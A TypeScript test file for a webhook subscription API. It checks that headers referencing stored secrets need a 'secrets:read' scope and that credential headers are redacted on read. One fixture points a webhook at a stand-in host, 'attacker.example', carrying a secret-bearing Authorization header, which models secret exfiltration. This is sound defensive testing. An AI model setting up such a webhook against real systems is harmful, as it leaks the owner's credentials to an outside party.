import { Hono, type Context, type Next } from "hono";
import { beforeEach, describe, expect, it, vi } from "vitest";

const caller = vi.hoisted(() => ({ scopes: [] as string[] }));
const createSubscription = vi.hoisted(() => vi.fn());
const updateSubscription = vi.hoisted(() => vi.fn());
const loadSecretPolicies = vi.hoisted(() => vi.fn());

vi.mock("../src/lib/redis.ts", () => ({ RedisKeys: { idempotency: () => "k" }, redis: {} }));
vi.mock("../src/db/index.ts", () => ({ db: {} }));
vi.mock("../src/api/middleware/auth.ts", async (original) => ({
  ...await original<typeof import("../src/api/middleware/auth.ts")>(),
  requireApiKey: async (c: Context, next: Next) => {
    c.set("authType", "apiKey");
    c.set("apiKeyId", "key_agent");
    c.set("workspaceId", "ws_1");
    c.set("environmentId", "env_prod");
    c.set("apiKeyScopes", caller.scopes);
    await next();
  },
}));
vi.mock("../src/api/middleware/rateLimit.ts", () => ({ rateLimitByWorkspace: async (_c: Context, next: Next) => next() }));
vi.mock("../src/api/middleware/halt.ts", () => ({ haltGuard: () => async (_c: Context, next: Next) => next() }));
vi.mock("../src/api/middleware/idempotency.ts", () => ({ idempotencyMiddleware: async (_c: Context, next: Next) => next() }));
vi.mock("../src/core/actions/secrets.ts", async (original) => ({
  ...await original<typeof import("../src/core/actions/secrets.ts")>(),
  loadSecretPolicies,
}));
vi.mock("../src/core/events/service.ts", async (original) => ({
  ...await original<typeof import("../src/core/events/service.ts")>(),
  createSubscription,
  updateSubscription,
}));
vi.mock("../src/api/routes/environment-context.ts", () => ({ resolveEnvironmentId: async () => "env_prod" }));

const eventsRouter = (await import("../src/api/routes/events.ts")).default;
const { toSubscription } = await import("../src/core/events/service.ts");
const { buildErrorResponse } = await import("../src/api/middleware/error.ts");
const app = new Hono();
app.onError((error, c) => buildErrorResponse(error, c));
app.route("/events", eventsRouter);

function send(method: string, path: string, body: unknown) {
  return app.request(path, { method, headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
}

const withSecret = { headers: { Authorization: "Bearer {{secret:STRIPE_KEY}}" } };

const routes = [
  { name: "subscription create", method: "POST", path: "/events/topics/orders/subscriptions", body: { url: "https://attacker.example/hook", ...withSecret }, service: createSubscription, scope: "events:write" },
  { name: "subscription update", method: "PATCH", path: "/events/subscriptions/sub_1", body: withSecret, service: updateSubscription, scope: "events:write" },
] as const;

beforeEach(() => {
  for (const fn of [createSubscription, updateSubscription, loadSecretPolicies]) fn.mockReset();
  createSubscription.mockResolvedValue({ id: "sub_1" });
  updateSubscription.mockResolvedValue({ id: "sub_1" });
  loadSecretPolicies.mockResolvedValue(new Map());
});

describe("secret references on subscriptions", () => {
  it.each(routes)("$name refuses a secret reference without secrets:read", async (route) => {
    caller.scopes = [route.scope];
    const res = await send(route.method, route.path, route.body);
    expect(res.status).toBe(403);
    expect(await res.text()).toMatch(/secrets:read/);
    expect(route.service).not.toHaveBeenCalled();
  });

  it.each(routes)("$name accepts it with secrets:read and checks the secret exists", async (route) => {
    caller.scopes = [route.scope, "secrets:read"];
    const res = await send(route.method, route.path, route.body);
    expect(res.status).toBeLessThan(300);
    expect(loadSecretPolicies).toHaveBeenCalledWith("ws_1", ["STRIPE_KEY"], "env_prod");
    expect(route.service).toHaveBeenCalled();
  });

  it.each(routes)("$name needs nothing extra when no header references a secret", async (route) => {
    caller.scopes = [route.scope];
    const body = { ...route.body, headers: { "X-Trace": "abc" } };
    const res = await send(route.method, route.path, body);
    expect(res.status).toBeLessThan(300);
    expect(loadSecretPolicies).not.toHaveBeenCalled();
  });
});

describe("subscription reads", () => {
  it("redact credential headers and keep the rest", () => {
    const subscription = toSubscription({
      subscriptionId: "sub_1", url: "https://example.com/hook", eventTypes: ["*"], enabled: true, secretEncrypted: null,
      headers: { Authorization: "Bearer legacy-raw-token", "X-Api-Key": "{{secret:K}}", "X-Auth-Token": "t", "X-Trace": "abc" },
      createdAt: new Date(), updatedAt: new Date(),
    } as Parameters<typeof toSubscription>[0]);
    expect(subscription.headers).toEqual({
      Authorization: "[REDACTED]", "X-Api-Key": "[REDACTED]", "X-Auth-Token": "[REDACTED]", "X-Trace": "abc",
    });
  });

  it("keep a subscription with no headers as null", () => {
    const subscription = toSubscription({
      subscriptionId: "sub_1", url: "https://example.com/hook", eventTypes: ["*"], enabled: true, secretEncrypted: null,
      headers: null, createdAt: new Date(), updatedAt: new Date(),
    } as Parameters<typeof toSubscription>[0]);
    expect(subscription.headers).toBeNull();
  });
});
